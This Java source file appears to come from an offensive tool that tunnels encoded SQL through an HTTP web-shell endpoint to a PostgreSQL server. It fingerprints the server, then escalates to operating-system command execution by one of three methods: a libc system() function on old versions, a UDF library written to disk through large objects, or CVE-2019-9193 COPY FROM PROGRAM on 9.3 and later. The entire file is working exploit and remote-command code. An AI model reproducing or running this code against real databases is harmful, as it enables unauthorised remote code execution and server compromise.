package Dao;

import Controller.PostgreSqlController;
import Entity.ControllersFactory;
import Util.*;
import org.json.JSONObject;

import java.io.File;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.nio.charset.StandardCharsets;
import java.sql.SQLException;
import java.text.MessageFormat;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * @author ch1ng
 * @date 2022/4/10
 */
public class PostgreSqlHttpDao {

    /**
     * 用此方法获取 PostgreSqlController 的日志框
     */
    private PostgreSqlController postgreSqlController = (PostgreSqlController) ControllersFactory.controllers.get(PostgreSqlController.class.getSimpleName());

    private JSONObject dataObj;
    private Map currentProxy = new HashMap();
    private Map<String, String> headers = new HashMap<>();
    private Map<String, String> params = new HashMap<>();

    private Double versionNumber = null;
    private String systemplatform = "";
    private String systemVersionNum = "";
    private String systemTempPath = "";
    private String evalType = "";
    private String pluginFile = "";

    public PostgreSqlHttpDao(JSONObject dataObj){
        this.dataObj = dataObj;
    }

    /**
     * 测试是否成功连接上数据库
     *
     * @return
     * @throws
     */
    public String testConnection() {
        String sql = PostgreSqlUtil.checkSql;
        String randomString = Utils.getRandomString();
        sql = Base64XOR.base64Encode(String.format(sql, randomString).getBytes(StandardCharsets.UTF_8),"UTF-8");
        try {
            String response = executeSQLStatement(this.dataObj,sql,"UTF-8");
            if(randomString.equals(response)){
                return "连接成功";
            }else if(response.contains("ERROR://")){
                return "连接失败！请检查地址账号密码等配置是否填写正确" + response.replace("ERROR://","");
            }
        } catch (Exception ex) {
            String error = ex.getMessage();
            MessageUtil.showExceptionMessage(ex, error);
        }
        return "连接失败";
    }

    public void getConnection(){
        String sql = PostgreSqlUtil.checkSql;
        String randomString = Utils.getRandomString();
        sql = Base64XOR.base64Encode(String.format(sql, randomString).getBytes(StandardCharsets.UTF_8),"UTF-8");
        try {
            String response = executeSQLStatement(this.dataObj,sql,"UTF-8");
            if(randomString.equals(response)){
                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("连接成功！"));
            }else if(response.contains("ERROR://")){
                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("连接失败！" + response.replace("ERROR://","")));
            }
        } catch (Exception ex) {
            String error = ex.getMessage();
            MessageUtil.showExceptionMessage(ex, error);
        }
    }

    public void getInfo() {
        List<String> wVersion = Arrays.asList("w64", "w32", "mingw", "visual studio", "Visual C++");
        String sql = PostgreSqlUtil.versionInfoSql;
        String specificVersionSql = PostgreSqlUtil.serverVersionInfoSql;
        sql = Base64XOR.base64Encode(sql.getBytes(StandardCharsets.UTF_8),"UTF-8");
        specificVersionSql = Base64XOR.base64Encode(specificVersionSql.getBytes(StandardCharsets.UTF_8),"UTF-8");
        try {
            String version = executeSQLStatement(this.dataObj,sql,"UTF-8");
            for (String str : wVersion) {
                if (version.contains(str)) {
                    systemplatform = "windows";
                    systemTempPath = "c:\\users\\public\\";
                    break;
                }
            }
            if ("".equals(systemplatform)) {
                systemplatform = "linux";
                systemTempPath = "/tmp/";
            }

            if (version.contains("32-bit")) {
                systemVersionNum = "32";
            } else {
                systemVersionNum = "64";
            }

            postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log(String.format("预判服务器类型：%s 服务器版本: %s", systemplatform, systemVersionNum)));
            postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log(String.format("PostgreSql 版本：%s", version)));

            String specificVersion = executeSQLStatement(this.dataObj,specificVersionSql,"UTF-8");
            String versionStr;
            if (specificVersion.indexOf(" ") > 0) {
                versionStr = specificVersion.substring(0, specificVersion.indexOf(" ") + 1);
            } else {
                versionStr = specificVersion;
            }
            String[] versionSplit = versionStr.split("\\.");
            versionNumber = Double.parseDouble(String.join(".", versionSplit[0], versionSplit[1]));

            if (versionNumber <= 8.2) {
                evalType = "low";
                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("版本小于 8.2 可直接创建 system 函数"));
            } else if (versionNumber > 8.2 && versionNumber < 9.3) {
                evalType = "udf";
                // 设置本地文件目录
                String path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "PostgreSql" + File.separator + versionNumber.toString() + "_" + systemplatform + "_" + systemVersionNum + "_hex.txt";
                pluginFile = Utils.readFile(path).replace("\n", "");
                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("版本可以尝试进行 UDF 提权"));
            } else if (versionNumber >= 9.3) {
                evalType = "cve";
                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("9.3 以上版本默认使用 CVE-2019-9193"));
            } else {
                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("该版本尚未编译UDF或无法提权"));
            }
        } catch (Exception ex) {
            String error = ex.getMessage();
            MessageUtil.showExceptionMessage(ex, error);
        }
    }

    /**
     * UDF提权函数
     */
    public void udf() {
        try {
            int randomPIN = (int) (Math.random() * 9000) + 1000;
            String locreateSql = String.format(PostgreSqlUtil.locreateSql,randomPIN);
            locreateSql = Base64XOR.base64Encode(locreateSql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String locreateResponse = executeSQLStatement(this.dataObj,locreateSql,"UTF-8");
            if(locreateResponse.contains("ERROR://")){
                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("语句执行错误！" + locreateResponse.replace("ERROR://","")));
                return;
            }

            // 写入udf
            injectUdf(randomPIN, pluginFile);
            String tempFile = systemTempPath + randomPIN + ".temp";
            String sqlExport = String.format(PostgreSqlUtil.loexportSql,randomPIN, tempFile);
            sqlExport = Base64XOR.base64Encode(sqlExport.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String sqlExportResponse = executeSQLStatement(this.dataObj,sqlExport,"UTF-8");
            if(sqlExportResponse.contains("ERROR://")){
                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("语句执行错误！" + sqlExportResponse.replace("ERROR://","")));
                return;
            }
            Thread.sleep(1000);



            String sqlFunc = String.format(PostgreSqlUtil.createSql, tempFile);
            sqlFunc = Base64XOR.base64Encode(sqlFunc.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String sqlFuncResponse = executeSQLStatement(this.dataObj,sqlFunc,"UTF-8");
            if(sqlFuncResponse.contains("ERROR://")){
                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("语句执行错误！" + sqlFuncResponse.replace("ERROR://","")));
                return;
            }
            Thread.sleep(500);


            String sqlUnlink = String.format(PostgreSqlUtil.lounlinkSql, randomPIN);
            sqlUnlink = Base64XOR.base64Encode(sqlUnlink.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String sqlUnlinkResponse = executeSQLStatement(this.dataObj,sqlUnlink,"UTF-8");
            if(sqlUnlinkResponse.contains("ERROR://")){
                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("语句执行错误！" + sqlUnlinkResponse.replace("ERROR://","")));
                return;
            }

            postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("UDF 库写入成功,请尝试执行系统命令"));
        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
    }

    private void injectUdf(int randomPIN, String udfHex) {
        /**
         * 分片4096个16进制插入largeobject
         * */
        try {
            String injectStr = PostgreSqlUtil.injectSql;
            List<String> udfSplit = Utils.getStrList(udfHex, 4096);

            for (int i = 0; i < udfSplit.size(); i++) {
                String injectHex = String.format(injectStr, randomPIN, i, udfSplit.get(i));
                String injectHexSql = Base64XOR.base64Encode(injectHex.getBytes(StandardCharsets.UTF_8),"UTF-8");
                String injectResponse = executeSQLStatement(this.dataObj,injectHexSql,"UTF-8");
                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log(String.format("正在插入第 %s 个 Large " +
                        "Object",i + 1)));
                if(injectResponse.contains("ERROR://")){
                    postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log(String.format("插入第 %s 个 Large " +
                            "Object 错误！", i + 1) + injectResponse.replace("ERROR://","")));
                    return;
                }
            }

        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
    }


    public String eval(String command, String code) throws SQLException {
        String result = "";
        switch (evalType) {
            case "low":
                result = LowVersionEval(command, code);
                break;
            case "udf":
                result = udfEval(command, code);
                break;
            default:
                result = cveEval(command, code);
        }
        return result;
    }

    public String LowVersionEval(String command, String code) throws SQLException {
        try {
            String createTempTableSql = PostgreSqlUtil.createTempTableSql;
            createTempTableSql = Base64XOR.base64Encode(createTempTableSql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String createTempTableResponse = executeSQLStatement(this.dataObj,createTempTableSql,"UTF-8");
            if(createTempTableResponse.contains("ERROR://")){
                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log( "创建临时表失败！" + createTempTableResponse.replace("ERROR://","")));
                return "";
            }


            String tempFile = systemTempPath + "postgre_system";

            String redirectSql = String.format(PostgreSqlUtil.redirectSql, command,tempFile);
            redirectSql = Base64XOR.base64Encode(redirectSql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String redirectResponse = executeSQLStatement(this.dataObj,redirectSql,"UTF-8");
            if(createTempTableResponse.contains("ERROR://")){
                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log( "重定向到临时表失败！" + redirectResponse.replace("ERROR://","")));
                return "";
            }


            String copySql = String.format(PostgreSqlUtil.copySql,tempFile);
            copySql = Base64XOR.base64Encode(copySql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String copyResponse = executeSQLStatement(this.dataObj,copySql,"UTF-8");
            if(copyResponse.contains("ERROR://")){
                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log( "拷贝到临时表失败！" + copyResponse.replace("ERROR://","")));
                return "";
            }


            String resultSql = PostgreSqlUtil.selectTempTableSql;
            resultSql = Base64XOR.base64Encode(resultSql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String resultResponse = executeSQLStatement(this.dataObj,resultSql,code);
            if(resultResponse.contains("ERROR://")){
                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log( "获取结果失败！" + resultResponse.replace(
                        "ERROR://","")));
                return "";
            }

            return resultResponse;

        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        } finally {
            String dropTempTableSql = PostgreSqlUtil.dropTempTableSql;
            dropTempTableSql = Base64XOR.base64Encode(dropTempTableSql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String dropTempTableResponse = executeSQLStatement(this.dataObj,dropTempTableSql,"UTF-8");
            if(dropTempTableResponse.contains("ERROR://")){
                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log( "删除临时表失败！" + dropTempTableResponse.replace("ERROR://","")));
            }

        }
        return "";
    }

    public String udfEval(String command, String code) {
        try {
            String evalSql = String.format(PostgreSqlUtil.evalSql,command);
            evalSql = Base64XOR.base64Encode(evalSql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String evalResponse = executeSQLStatement(this.dataObj,evalSql,code);
            if(evalResponse.contains("ERROR://")){
                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log( "执行命令失败！" + evalResponse.replace(
                        "ERROR://","")));
                return "";
            }
            return evalResponse;

        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
        return "";
    }

    // https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#cve-20199193
    public String cveEval(String command, String code) throws SQLException {
        try {

            // 单引号需要双写转义
            String repCommand = command.replace("'", "''");

            String dropCmdtableSql = PostgreSqlUtil.dropCmdtableSql;
            dropCmdtableSql = Base64XOR.base64Encode(dropCmdtableSql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String dropCmdtableResponse = executeSQLStatement(this.dataObj,dropCmdtableSql,code);
            if(dropCmdtableResponse.contains("ERROR://")){
                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log( "删除 CMD_EXEC 表失败！" + dropCmdtableResponse.replace("ERROR://","")));
                return null;
            }


            String createCmdtableSql = PostgreSqlUtil.createCmdtableSql;
            createCmdtableSql = Base64XOR.base64Encode(createCmdtableSql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String createCmdtableResponse = executeSQLStatement(this.dataObj,createCmdtableSql,code);
            if(createCmdtableResponse.contains("ERROR://")){
                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log( "创建 CMD_EXEC 表失败！" + createCmdtableResponse.replace("ERROR://","")));
                return null;
            }

            String runCmdSql = String.format(PostgreSqlUtil.runCmdSql, repCommand);
            runCmdSql = Base64XOR.base64Encode(runCmdSql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String runCmdResponse = executeSQLStatement(this.dataObj,runCmdSql,code);
            if(runCmdResponse.contains("ERROR://")){
                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log( "命令执行失败！" + runCmdResponse.replace(
                        "ERROR://","")));
                return null;
            }


            String selectCmdResSql = PostgreSqlUtil.selectCmdResSql;
            selectCmdResSql = Base64XOR.base64Encode(selectCmdResSql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String selectCmdResResponse = executeSQLStatement(this.dataObj,selectCmdResSql,code);
            if(selectCmdResResponse.contains("ERROR://")){
                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log( "获取结果失败！" + selectCmdResResponse.replace("ERROR://","")));
                return null;
            }

            dropCmdtableResponse = executeSQLStatement(this.dataObj,dropCmdtableSql,code);
            if(dropCmdtableResponse.contains("ERROR://")){
                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log( "删除 CMD_EXEC 表失败！" + dropCmdtableResponse.replace("ERROR://","")));
                return null;
            }


            return selectCmdResResponse;

        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
        return null;
    }

    /**
     * postgres < 8.2直接使用system函数执行命令
     */
    public void createEval() {
        try {
            List<String> libFiles = Arrays.asList("/lib/x86_64-linux-gnu/libc.so.6", "/lib/libc.so.6", "/lib64/libc.so.6");
            for (String libFile : libFiles) {
                try {
                    String libSql = MessageFormat.format(PostgreSqlUtil.libSql, libFile);
                    libSql = Base64XOR.base64Encode(libSql.getBytes(StandardCharsets.UTF_8),"UTF-8");
                    String CmdResResponse = executeSQLStatement(this.dataObj,libSql,"UTF-8");
                    if(CmdResResponse.contains("ERROR://")){
                        postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log( "创建 system 函数失败！" + CmdResResponse.replace("ERROR://","")));
                        return ;
                    }

                    postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("版本 <=8.2 创建 system 函数成功," +
                            "使用 copy 获取回显,无法回显请 OOB"));
                } catch (Exception e) {
                    MessageUtil.showExceptionMessage(e, e.getMessage());
                }
            }
        } catch (Exception e) {
            postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log(e.getMessage()));
        }
    }

    public void clear() {
        try {
            String dropEvalSql = PostgreSqlUtil.dropEvalSql;
            dropEvalSql = Base64XOR.base64Encode(dropEvalSql.getBytes(StandardCharsets.UTF_8),"UTF-8");
            String dropEvalResponse = executeSQLStatement(this.dataObj,dropEvalSql,"UTF-8");
            if(dropEvalResponse.contains("ERROR://")){
                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log( "删除 system 函数失败！" + dropEvalResponse.replace("ERROR://","")));
                return ;
            }
            postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("删除 system 函数成功！"));
        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }

    }


    /**
     * 执行 Sql 语句
     * @param dataObj
     * @param sql
     * @return
     */
    private String executeSQLStatement(JSONObject dataObj, String sql, String code) {
        String url = dataObj.getString("url");
        String timeOut = dataObj.getString("timeout");
        String isProxy = dataObj.getString("isproxy");
        String header = dataObj.getString("httpheaders");
        String key = dataObj.getString("encryptionkey");
        String args = dataObj.getString("ipaddress" )+ ":" + dataObj.getString("port") + "|";
        args += dataObj.getString("username") + "|";
        args += dataObj.getString("password") + "|";
        args += dataObj.getString("database") + "|";
        args += sql;
        //args += Base64XOR.base64Encode(String.format(sql, randomString).getBytes(StandardCharsets.UTF_8),"UTF-8");
        params.put(key, Base64XOR.encode(args,key));
        try {
            if(!header.equals("")){
                headers = Utils.splitHeaders(header);
            }
            if(!isProxy.equals("false")){
                Proxy proxy;
                String proxyAddress = this.dataObj.getString("proxyaddress");
                String proxyType =  this.dataObj.getString("proxytype");
                String proxyPort = this.dataObj.getString("proxyport");
                String proxyuUername = this.dataObj.getString("proxyusername");
                String proxyPassword = this.dataObj.getString("proxypassword");
                InetSocketAddress proxyAddr = new InetSocketAddress(proxyAddress, Integer.parseInt(proxyPort));
                if("SOCKS5".equals(proxyType)){
                    proxy = new Proxy(Proxy.Type.SOCKS, proxyAddr);
                }else {
                    proxy = new Proxy(Proxy.Type.HTTP, proxyAddr);
                }
                currentProxy.put("proxy", proxy);
                currentProxy.put("username", proxyuUername);
                currentProxy.put("password", proxyPassword);
            }
            String response = OKHttpUtil.getBodyWithPost(url,params,headers,Integer.parseInt(timeOut),"UTF-8",currentProxy);
            return Base64XOR.decode(response,key,code);
        } catch (Exception ex) {
            String error = ex.getMessage();
            MessageUtil.showExceptionMessage(ex, error);
        }
        return "";
    }
}
